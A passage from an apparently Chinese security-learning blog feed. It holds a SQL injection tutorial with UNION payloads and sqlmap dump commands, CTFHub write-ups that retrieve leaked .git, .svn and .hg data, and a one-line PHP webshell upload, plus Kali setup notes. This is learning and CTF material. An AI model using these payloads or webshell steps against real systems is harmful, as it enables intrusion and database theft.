QL%E8%AF%AD%E5%8F%A5%EF%BC%8C%E7%94%A8%E6%9D%A5%E5%88%9B%E5%BB%BA%E6%89%80%E9%9C%80%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E4%B8%8BSQL%E8%AF%AD%E5%8F%A5%E5%9C%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E8%A2%AB%E5%8A%A8%E6%80%81%E7%9A%84%E6%9E%84%E9%80%A0%E4%BD%BF%E7%94%A8%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9D%A1%E4%BB%B6%E4%BA%A7%E7%94%9F%E4%B8%8D%E5%90%8C%E7%9A%84SQL%E8%AF%AD%E5%8F%A5%EF%BC%8C%E6%AF%94%E5%A6%82%E9%9C%80%E8%A6%81%E6%A0%B9%E6%8D%AE%E4%B8%8D%E5%90%8C%E7%9A%84%E8%A6%81%E6%B1%82%E6%9D%A5%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E3%80%82%E8%BF%99%E6%A0%B7%E7%9A%84%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B%E5%85%B6%E5%AE%9E%E4%B8%BASQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%95%99%E4%B8%8B%E4%BA%86%E5%BE%88%E5%A4%9A%E7%9A%84%E5%8F%AF%E4%B9%98%E4%B9%8B%E6%9C%BA%E3%80%82">http://www.example.com?test=123，此时URL实际向服务器传递了值为123的变量test，这表明当前页面是对数据库进行动态查询的结果。由此，我们可以在URL中插入恶意的SQL语句并进行执行。另外，在网站开发过程中，开发人员使用动态字符串构造SQL语句，用来创建所需的应用，这种情况下SQL语句在程序的执行过程中被动态的构造使用，可以根据不同的条件产生不同的SQL语句，比如需要根据不同的要求来查询数据库中的字段。这样的开发过程其实为SQL注入攻击留下了很多的可乘之机。</a></p>
+<h1 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h1><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>当输入的参数为整型时，如ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入。这种数字型注入最多出现在ASP、PHP等弱类型语言中，弱类型语言会自动推导变量类型，例如，参数id=8，PHP会自动推导变量id的数据类型为int类型，那么id=8 and  1=1，则会推导为string类型，这是弱类型语言的特性。而对于Java、C#这类强类型语言，如果试图把一个字符串转换为int类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞。 </p>
+<h3 id="判断方式"><a href="#判断方式" class="headerlink" title="判断方式"></a>判断方式</h3><ol>
+<li>url为 **<a href="https://www.wha1e.cn/text?id=1&#39;**%E6%97%B6">https://www.wha1e.cn/text?id=1&#39;**时</a> 有一个多余的“**’**”使查询错误</li>
+<li>url为 <strong><a href="https://www.wha1e.cn/text?id=1">https://www.wha1e.cn/text?id=1</a> and 1 = 1</strong> 时, 没有报错, 除非在代码处做了限制(不允许有and字符串)</li>
+<li>url为 <strong><a href="https://www.wha1e.cn/text?id=1">https://www.wha1e.cn/text?id=1</a> and 1 = 2</strong> 时, 由于1=2不成立, 也会报错</li>
+</ol>
+<h3 id="注入实例"><a href="#注入实例" class="headerlink" title="注入实例"></a>注入实例</h3><p>在浏览器地址栏输入：<code>learn.me/sql/article.php?id=1</code>，这是一个get型接口，发送这个请求相当于调用一个查询语句：</p>
+<p><code>$sql = &quot;SELECT * FROM article WHERE id =&quot;,$id</code><br>正常情况下，应该返回一个id=1的文章信息。那么，如果在浏览器地址栏输入：<code>learn.me/sql/article.php?id=-1 OR 1 =1</code>，这就是一个SQL注入攻击了，可能会返回所有文章的相关信息。为什么会这样呢？</p>
+<p>这是因为，id = -1永远是false，1=1永远是true，所有整个where语句永远是ture，所以where条件相当于没有加where条件，那么查询的结果相当于整张表的内容</p>
+<p><strong>原文链接：</strong><a href="https://blog.csdn.net/github_36032947/article/details/78442189">https://blog.csdn.net/github_36032947/article/details/78442189</a></p>
+<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>1.检查是否存在注入</p>
+<p><code>and 1=1 返回正确</code></p>
+<p><code>and 1=2 返回错误</code> </p>
+<p>2.猜字段</p>
+<p><code>order by x</code>(x为数字)</p>
+<p>得出字段数</p>
+<p>3.爆数据库名</p>
+<p><code>?id=1 and 1=2 union select 1,database()</code></p>
+<p>得到数据库名称</p>
+<p>4.爆列表</p>
+<p><code>?id=1 and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#39;sqli&#39;</code>(sqli为数据库名)</p>
+<p><del>因为感觉没有例题空谈无用，所以先去找相对应的题目了。</del></p>
+<p><del>后续更新。。。</del></p>
+<p><strong>我是鸽子王</strong></p>
+<p>不知不觉就拖了几个月，经历了很多，招新工作已经开始展开了，还是一个菜鸡。</p>
+<p>下面附上sqlmap使用教程：</p>
+<h1 id="sqlmap一把梭"><a href="#sqlmap一把梭" class="headerlink" title="sqlmap一把梭"></a>sqlmap一把梭</h1><p>有人说sqlmap没有灵魂，但是不可否认sqlmap的便利性，只要是人就会出错，就会有忘记的点，但是工具不会。</p>
+<p>我从大佬那里取经来的学习过程应该是先学会工具的使用，熟悉其原理，最后可以自己写出相同原理的工具。</p>
+<h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><h3 id="1-可以直接url注入"><a href="#1-可以直接url注入" class="headerlink" title="1.可以直接url注入"></a>1.可以直接url注入</h3><p>1.查询是否存在注入点：</p>
+<p>Windows：<code>py -2 sqlmap.py -u &quot;url/?id=XX&quot;</code><br>Linux：<code>sqlmap -u &quot;url/?id=XX&quot;</code><br>后面全在Linux系统下进行<br>2.查询当前数据库：<br><code>sqlmap -u &quot;url/?id=XX&quot; --current-db</code><br>3.查询指定数据库所拥有的数据表：<br>以数据库名sqli为例<br><code>sqlmap -u &quot;url/?id=XX&quot; -D sqli --tables</code><br>3.查询指定数据库所拥有的数据表有哪些列：<br>以数据表名fl4g为例<br><code>sqlmap -u &quot;url/?id=XX&quot; -D sqli -T fl4g -columns</code><br>4.查询指定数据库所拥有的数据表的数据列的内容：<br>以数据列名为falg为例<br><code>sqlmap -u &quot;url/?id=XX&quot; -D sqli -T fl4g -C flag -dump</code></p>
+<h3 id="2-基于post请求，burp-suite找到注入点，进行注入"><a href="#2-基于post请求，burp-suite找到注入点，进行注入" class="headerlink" title="2.基于post请求，burp suite找到注入点，进行注入"></a>2.基于post请求，burp suite找到注入点，进行注入</h3><p>使用hackbar插件，传入post请求如:id=1</p>
+<p>利用BP抓取返回包，找到注入点，将id=1删除，保存请求包为txt，进行sql注入<br>方法同上，区别在于将“-u”改为“-r”;以绝对路径为”/home/wha1e/1.txt/“为例</p>
+<p>1.查询是否存在注入点：<br>Linux：<code>sqlmap -r /home/wha1e/1.txt/</code><br>后面全在Linux系统下进行<br>2.查询当前数据库：<br><code>sqlmap -r /home/wha1e/1.txt/ --current-db</code><br>3.查询指定数据库所拥有的数据表：<br>以数据库名sqli为例<br><code>sqlmap -r /home/wha1e/1.txt/ -D sqli --tables</code><br>3.查询指定数据库所拥有的数据表有哪些列：<br>以数据表名fl4g为例<br><code>sqlmap -r /home/wha1e/1.txt/ -D sqli -T fl4g -columns</code><br>4.查询指定数据库所拥有的数据表的数据列的内容：<br>以数据列名为falg为例<br><code>sqlmap -r /home/wha1e/1.txt/ -D sqli -T fl4g -C flag -dump</code></p>
+<h3 id="稍有难度的注入"><a href="#稍有难度的注入" class="headerlink" title="稍有难度的注入"></a>稍有难度的注入</h3><h4 id="cookie注入："><a href="#cookie注入：" class="headerlink" title="cookie注入："></a>cookie注入：</h4><p>格式稍微有一点变化，总体流程不变，下面为查询当前数据库的例子：<br><code>sqlmap -u url/? --cookie &quot;id=1&quot; -dbs</code></p>
+<h4 id="使用脚本："><a href="#使用脚本：" class="headerlink" title="使用脚本："></a>使用脚本：</h4><p>在指令行最后输入 :<code>sqlmap -u &quot;url/?id=XX --tamper=XXX.py</code></p>
+<h4 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入:"></a>UA注入:</h4><p>至少需要把等级调到三级</p>
+<p><code>sqlmap -u &quot;url/?id=XX --level 3</code></p>
+<h4 id="referer注入："><a href="#referer注入：" class="headerlink" title="referer注入："></a>referer注入：</h4><p>使用post请求，bp抓包，保存txt。</p>
+<p>命令：<code>sqlmap -r /home/wha1e/1.txt -p referer </code></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>note</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali_misc工具</title>
+    <url>/2021/07/10/kali_misc%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>kali上有太多好用的工具了，这里介绍如何在上面安装misc工具</p>
+<span id="more"></span>
+
+<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>kali</strong> 安装好之后，我们需要对里面的工具进行升级。为了可以顺利安装工具，我们应该先进行换源。</p>
+<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>1.<code>sudo vim /etc/apt/sources.list</code></p>
+<p>2.<code>a</code></p>
+<p>3.在后面添加源，将原有源注释掉；</p>
+<p>4.esc退出</p>
+<p>5.<code>:wq</code>保存</p>
+<h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>1.安装文本编辑器：sudo apt-get install leafpad</p>
+<p>2.用文本编辑器打开文件：leafpad /etc/apt/sources.list</p>
+<p>3.在后面添加源，将原有源注释掉；</p>
+<p>4.退出保存</p>
+<h3 id="一些国内源"><a href="#一些国内源" class="headerlink" title="一些国内源"></a>一些国内源</h3><p>#中科大<br>deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>#阿里云<br>deb <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>#清华大学<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>#163<br>deb <a href="http://mirrors.163.com/debian">http://mirrors.163.com/debian</a> wheezy main non-free contrib<br>deb-src <a href="http://mirrors.163.com/debian">http://mirrors.163.com/debian</a> wheezy main non-free contrib<br>deb <a href="http://mirrors.163.com/debian">http://mirrors.163.com/debian</a> wheezy-proposed-updates main non-free contrib<br>deb-src <a href="http://mirrors.163.com/debian">http://mirrors.163.com/debian</a> wheezy-proposed-updates main non-free contrib<br>deb-src <a href="http://mirrors.163.com/debian-security">http://mirrors.163.com/debian-security</a> wheezy/updates main non-free contrib </p>
+<p>#浙大源</p>
+<p>deb <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p>
+<p>deb-src <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p>
+<p>#东软大学<br>deb <a href="http://mirrors.neusoft.edu.cn/kali">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib<br>deb-src <a href="http://mirrors.neusoft.edu.cn/kali">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib<br>#官方源<br>deb <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p>
+<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>1.先执行：<code>apt-get update</code></p>
+<p>2.再执行：<code>apt-get upgrade</code></p>
+<p>3.重启：<code>reboot</code></p>
+<p>时间可能会比较长，耐心等待就好了</p>
+<p>这样一来kali的基本配置就准备好了。可以开始安装工具了！</p>
+<h2 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h2><p>tree的功能是创建文件列表，然后将文件列表以树的形式列出来。这应该算是基本工具。</p>
+<p>安装：<code>sudo apt-get install tree</code></p>
+<p>tree的一些基本用法：</p>
+<p><code>-a 显示所有文件和目录。</code><br><code>-A 使用ASNI绘图字符显示树状图而非以ASCII字符组合。</code><br><code>-C 在文件和目录清单加上色彩，便于区分各种类型。</code><br><code>-d 显示目录名称而非内容。</code><br><code>-D 列出文件或目录的更改时间。</code><br><code>-f 在每个文件或目录之前，显示完整的相对路径名称。</code><br><code>-F 在执行文件，目录，Socket，符号连接，管道名称名称，各自加上&quot;*&quot;,&quot;/&quot;,&quot;=&quot;,&quot;@&quot;,&quot;|&quot;号。</code><br><code>-g 列出文件或目录的所属群组名称，没有对应的名称时，则显示群组识别码。</code><br><code>-i 不以阶梯状列出文件或目录名称。</code><br><code>-I 不显示符合范本样式的文件或目录名称。</code><br><code>-l 如遇到性质为符号连接的目录，直接列出该连接所指向的原始目录。</code><br><code>-n 不在文件和目录清单加上色彩。</code><br><code>-N 直接列出文件和目录名称，包括控制字符。</code><br><code>-p 列出权限标示。</code><br><code>-P 只显示符合范本样式的文件或目录名称。</code><br><code>-q 用&quot;?&quot;号取代控制字符，列出文件和目录名称。</code><br><code>-s 列出文件或目录大小。</code><br><code>-t 用文件和目录的更改时间排序。</code><br><code>-u 列出文件或目录的拥有者名称，没有对应的名称时，则显示用户识别码。</code><br><code>-x 将范围局限在现行的文件系统中，若指定目录下的某些子目录，其存放于另一个文件系统上，则将该子目录予以排除在寻找范围外</code></p>
+<h1 id="图片工具"><a href="#图片工具" class="headerlink" title="图片工具"></a>图片工具</h1><h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><p>我最早接触的工具之一，foremost 是一个 控制台程序 ，用于根据页眉，页脚和内部数据结构 恢复文件 。 Foremost 可以处理图像文件，例如由 dd ， Safeback ， Encase 等生成的图像文件，或直接在驱动器上。 页眉和页脚可以由配置文件指定，也可以使用命令行开关指定内置文件类型。</p>
+<p>可以用于分离一些binwalk做不能分离的文件</p>
+<p>foremost在kali linux已经预装。<br><code>apt-get install foremost</code></p>
+<p>直接可以安装完成。</p>
+<p>foremost最常用用法：</p>
+<p><code>foremost -i filename</code></p>
+]]></content>
+      <categories>
+        <category>misc</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>kali</tag>
+        <tag>tool</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于我和kali的安装之路</title>
+    <url>/2021/07/03/%E4%B8%80%E4%B8%AA%E8%B8%A9%E4%BA%86%E5%A4%A7%E5%8D%8A%E5%B9%B4%E7%9A%84%E5%9D%91/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一时重装一时爽，一直重装一直爽</p>
+<span id="more"></span>
+<p>自去年安装好了第一个Linux系统之后就一直有一个困扰我许久的问题–联网。<br>我的第一个Linux系统是Ubuntu，安装简单。但是相较于Ubuntu，我更喜欢专业的kali;因为教程问题，导致安装kali失败N多次，最后在排除法以及仔细阅读了安装时系统提出的问题之后，现在已经可以熟练安装了。<br>迎接安装成功的下一个问题就是断网卡。<br>kali安装时默认net连接自动联网，但是在我有一段时间不使用kali之后，再次开机它就断网卡了。无论我实验网上可以搜集到的各种方法，都无效。于是乎就只有一个办法，重装系统。<br>前几天我的常用kali又又又崩了，出于对内部工具的不舍，不甘心又一次重装，就找了一下PMR帮我用向日葵远端操作一下。结果还是以失败告终。<br>最终问了一下N神，他告诉我这应该是电脑自身的问题，不可以使用VMware挂起，如果要恢复的话就只能使用快照恢复。所以为了避免这种问题，以后我要常备份，不后台挂起。</p>
+]]></content>
+      <categories>
+        <category>operating system</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfhub信息泄露</title>
+    <url>/2021/04/17/ctfhub%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2wp/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ctfhub web之信息泄露</p>
+<span id="more"></span>
+
+<h4 id="目录遍历与PHPINFO"><a href="#目录遍历与PHPINFO" class="headerlink" title="目录遍历与PHPINFO"></a>目录遍历与PHPINFO</h4><p>0难度</p>
+<h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h5><p>依次打开文件夹即可，共16种可能，flag为随机出现</p>
+<p>属于签到题</p>
+<h5 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h5><p>页面内查找关键字”ctfhub”get flag </p>
+<h4 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h4><h5 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h5><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%811.png?versionId=CAEQDhiBgIDF5vaLxxciIDBjZmZkNDQ5ZGUxOTRkMjBhYzAwNjFjNTdlMTViMGVi"></p>
+<p>dirsearch扫描</p>
+<p>命令如下（windows环境）：</p>
+<p>python dirsearch.py -u 网址 -e php 或 python .\dirsearch.py -u 网址 -e php</p>
+<p>扫描结果</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%813.png?versionId=CAEQDhiBgICCnPqnxxciIDI5MmE3OGY5M2JmMTRhODc5OTM3ZjFkMWYwODI1YTQz"></p>
+<p>网址+<a href="http://www.zip下载三个文件/">www.zip下载三个文件</a></p>
+<p>最终网站访问获得flag</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81.png?versionId=CAEQDhiBgMCGnPqnxxciIDYwYjcxYjhiNTk3OTQzYjk4OWVhNzc0MDIxNzBlNTVj"></p>
+<h5 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h5><p>dirsearch扫描</p>
+<p>获取三个文件</p>
+<p><strong>/index.php</strong></p>
+<p><strong>/index.php.bak</strong></p>
+<p><strong>/index.php/llogin/</strong></p>
+<p>浏览器网址+/index.php.bak打开</p>
+<p>下载完成后打开获取flag</p>
+<h5 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h5><p>kali下进行</p>
+<p>终端：</p>
+<ol>
+<li>wget <a href="http://challenge-0179187a5798aa64.sandbox.ctfhub.com:10080/.index.php.swp">http://challenge-0179187a5798aa64.sandbox.ctfhub.com:10080/.index.php.swp</a></li>
+<li>cat .index.php.swp</li>
+</ol>
+<p>获取flag</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/vim%E7%BC%93%E5%AD%982.png?versionId=CAEQDhiBgIC2uI6oxxciIGMxNDMwNTY4MDMyYTQ5YTZhMzIxYzBkODFlOTRlMDdh"></p>
+<h5 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h5><p>同vim缓存</p>
+<p>kali下进行</p>
+<p>终端：</p>
+<ol>
+<li>wget <a href="http://challenge-0179187a5798aa64.sandbox.ctfhub.com:10080/.DS_Store">http://challenge-0179187a5798aa64.sandbox.ctfhub.com:10080/.DS_Store</a></li>
+<li>cat .index.php.swp</li>
+</ol>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/.DS_Store1.png?versionId=CAEQDhiBgICFipSoxxciIDhkZGE4Zjc4MzEzYzRmZDA5M2IwZGE0NzY5NjNmY2Vi"></p>
+<p>浏览器访问：</p>
+<p>网址/cf4390cd5ee7e79529e10649859bd647.txt</p>
+<p>获取flag</p>
+<h4 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h4><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
+<h5 id="log"><a href="#log" class="headerlink" title="log"></a>log</h5><h6 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h6><p>githack官网上下载下来的是python2版本，如今大多数用的都是python3，所以还需下载一个python2。``</p>
+<p>cmd中输入python所调用的脚本是环境变量中前面的那一个，如果每一次切换版本还需要更改环境变量也太麻烦了，所以可以使用命令来切换。</p>
+<p> <strong>py -2调用python2，py -3调用的是python3</strong></p>
+<h6 id="开灶"><a href="#开灶" class="headerlink" title="开灶"></a>开灶</h6><p>githack clone 目标源代码到本地</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">py -2 http:&#x2F;&#x2F;challenge-070d7210e3108a89.sandbox.ctfhub.com_10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>执行 <code>git log</code> 查看历史记录</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/log1.png?versionId=CAEQFRiBgIDci9X9yxciIDEzOWI4NDFiY2I2MjQ1ZmY5OWRmZmJjYTJlZWUwMWRj"></p>
+<p><code>git diff 9bd149...</code></p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/log3.png?versionId=CAEQFRiBgIC.i9X9yxciIGRlYWU4NDVmYjBhNDQyYmU4NjI0MTQxMDJkOGQ2NjQ0"></p>
+<h5 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h5><h6 id="git-stash-的作用"><a href="#git-stash-的作用" class="headerlink" title="git stash 的作用"></a>git stash 的作用</h6><p>git stash用于想要保存当前的修改,但是想回到之前最后一次提交的干净的工作仓库时进行的操作.git stash将本地的修改保存起来,并且将当前代码切换到HEAD提交上.</p>
+<p>通过git stash存储的修改列表,可以通过git stash list查看.git stash show用于校验,git stash apply用于重新存储.直接执行git stash等同于git stash save.</p>
+<p>最新的存储保存在refs/stash中.老的存储可以通过相关的参数获得,例如stash@{0}获取最新的存储,stash@{1}获取次新.stash@{2.hour.ago}获取两小时之前的.存储可以直接通过索引的位置来获得stash@{n}.</p>
+<h6 id="开灶-1"><a href="#开灶-1" class="headerlink" title="开灶"></a>开灶</h6><p>githack clone–&gt;git log</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/stash1.png?versionId=CAEQFRiBgIDCiIr.yxciIGQ5ZDk4YTFhYTM5ZTQ5ODliNzRhYjMyNGU5MmUxY2Nh"></p>
+<p>执行 git stash list 发现有 stash,然后git stash pop </p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/stash2.png?versionId=CAEQFRiBgMCMiIr.yxciIDFlMjk3ZTk5YzU5NjRmYjk5YmI2Mjk4NTJlNDI4MDYx"></p>
+<p>再次git diff 6458b52874b51846c2ca53a26b0add249369b532</p>
+<p>get flag</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/stash3.png?versionId=CAEQFRiBgMCqiIr.yxciIDliMmVjZGQ4YzQzNDQ2OTE4ZjkyMTM0OGYyMzJjMThk"></p>
+<h5 id="index"><a href="#index" class="headerlink" title="index"></a>index</h5><p>因为实在太混所以一直对着wp写的，尝试自己做一题，结果githack clone下来后就打开文件夹就最直接存在<strong>flag.txt</strong>。</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/index1.png?versionId=CAEQFRiBgID31IOKzBciIDNlMmMyNDFmYzM0ODRlZGJiZDU1YjEyZGU1ZDYwMGI4"></p>
+<h4 id="SVN泄露与HG泄露"><a href="#SVN泄露与HG泄露" class="headerlink" title="SVN泄露与HG泄露"></a>SVN泄露与HG泄露</h4><h5 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h5><h6 id="写在前面-1"><a href="#写在前面-1" class="headerlink" title="写在前面"></a>写在前面</h6><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
+<h6 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h6><p>dvcs-ripper中的rip-svn.pl clone下来</p>
+<p>前期因为命令错误一直导致clone失败，正确命令：</p>
+<p><code>perl rip-svn.pl -v -u http://120.132.56.20:1515/.svn/</code></p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/.svn1.png?versionId=CAEQFhiBgICkofPkzBciIDA5MmQ3ZDUwNDQyNDRkNGU5NWYwZmExMDZlYWRjOGY2"></p>
+<p><code>tree .svn</code></p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/.svn2.png?versionId=CAEQFhiBgMDhofPkzBciIDVlZTZkZDZlNDM4MzQzM2I5ZGZmM2Q4ZGMyOTY1NmMy"></p>
+<p><code>cd .svn/pristine/</code></p>
+<p><code>cat 00/00c73b1c8ee0f1d111180fb329e39c7f8dce7900.svn-base</code></p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/.svn3.png?versionId=CAEQFhiBgMClofPkzBciIGJmNWFjZmZjMjI0MTQyMzdiNjlhMjIzYTNmZWY3MjNl"></p>
+<p>get  flag</p>
+<h5 id="hg泄露"><a href="#hg泄露" class="headerlink" title="hg泄露"></a>hg泄露</h5><h6 id="写在前面-2"><a href="#写在前面-2" class="headerlink" title="写在前面"></a>写在前面</h6><p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
+<h6 id="开灶-2"><a href="#开灶-2" class="headerlink" title="开灶"></a>开灶</h6><p>使用 <code>dvcs-ripper</code> 工具中的 <code>rip-hg.pl</code> 脚本进行 clone。</p>
+<p>发现直接执行 hg status 出错，工具 clone 的时候并没有 clone 完整，再次证明不能过分相信工具不要过分迷信工具。</p>
+<p>查看<code>.hg/store/fncache</code></p>
+<p>可知flag文件名为<code>flag_2592426997.txt</code></p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/hg1.png?versionId=CAEQFRiBgICQ5b6SzBciIDg1NDhjMGI5OTVhNjRlMDBiMTMwMTYyZGFlYzdjMWYy"></p>
+<p>浏览器直接访问获得flag</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/hg2.png?versionId=CAEQFRiBgMD35L6SzBciIDc4YThjNTg3YTRkODQ1Mzk5ZDAxOWNjMmFjNWU0M2E4"></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>ctfhub信息泄露就此上传完毕</p>
+<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.png?versionId=CAEQFhiBgID7hfzkzBciIDI3NzVjYzJiNTk0ODRiZTA4YjM1NmZkMWI3NTAwOGFl"></p>
+<p>学艺不精所以题目都是看着wp完成的，有很多疑问来不及解决，留下了许多空白，需要不断学习来回头补充。</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>信息泄露</tag>
+        <tag>write up</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfhub文件上传</title>
+    <url>/2021/04/15/ctfhub%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wp/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ctfhub web之文件上传</p>
+<span id="more"></span>
+
+<h4 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h4><p>编写一句话木马并上传<br><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC.png?versionId=CAEQDhiBgIDlw6TgxhciIDZkODI4ZmVkNzJhYjQxMjBiN2JkYjIzODM3OTc0OWE0"></p>
+<p>获取相对路径</p>
+<p>upload/shell.php</p>
+<p>打开中国蚁剑上传</p>
+<p>右键–&gt;添加数据–&gt;网址+相对路径–&gt;打开flag.php</p>
+<p>获取flag</p>
